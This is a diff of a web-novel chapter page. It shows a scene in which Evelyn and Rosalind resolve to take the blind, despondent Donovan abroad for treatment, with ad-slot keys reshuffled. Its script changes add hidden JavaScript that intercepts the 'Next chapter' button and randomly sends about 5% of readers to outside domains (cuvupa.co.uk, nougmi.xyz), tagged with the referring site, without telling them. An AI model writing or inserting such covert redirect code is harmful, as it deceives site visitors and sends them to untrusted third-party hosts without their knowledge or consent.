@@ -2389,23 +2389,23 @@
                 <p>&#34;Of course,&#34; Rosalind agreed, then hesitated. &#34;But getting his cooperation won&#39;t be simple.&#34;</p>
                 <p>Evelyn glanced at Donovan basking in sunlight. He resembled a dying plant starved of water. She approached and knelt beside his wheelchair, taking his limp hand in hers. His hollow cheeks and sunken eyes broke her heart.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>&#34;Donovan, will you let me take you abroad for treatment? Your legs can heal. The blindness is from head trauma - it&#39;s not permanent. Please don&#39;t give up.&#34; She squeezed his icy fingers. &#34;Does nothing in this world matter to you anymore? Your family loves you. They want to see you recover. Wouldn&#39;t you want to live if you could walk and see again?&#34;</p>
                 <p>Silence.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Rosalind stepped forward. &#34;Evelyn, save your breath. I&#39;ve recited every motivational quote and self-help book daily. Nothing gets through.&#34;</p>
                 <p>Evelyn looked up worriedly. &#34;Then what do we do?&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Rosalind helped Evelyn stand before gripping Donovan&#39;s wheelchair handles. Leaning close, she spoke directly to his closed eyelids. &#34;Listen carefully. We&#39;re taking you to Solterra for treatment. Your opinion doesn&#39;t matter - we&#39;re doing this.&#34;</p>
                 <p>Straightening, she smiled at Evelyn. &#34;There. He agreed.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>Evelyn blinked between Rosalind and the unresponsive Donovan.</p>
                 <p>&#34;I&#39;ll pack our things. Wait here,&#34; Rosalind said, heading upstairs.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Rosalind Baskins approached Evelyn, glancing between Donovan and the stairs before whispering, &#34;Evelyn, doesn&#39;t Mr. Blackwood seem...different?&#34;</p>
                 <p>&#34;How so?&#34;</p>
                 <p>&#34;Last visits, he&#39;d scream and throw things to drive us away. Now he&#39;s like an empty shell,&#34; Rosalind observed.</p>
@@ -2414,7 +2414,7 @@
                 <p>Evelyn startled. &#34;Rosalind? Controlling Donovan?&#34;</p>
                 <p>Rosalind pressed her lips together and gave a firm nod.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
             </div>
             
             <div class="font-controls">
@@ -2536,7 +2536,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2552,8 +2552,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
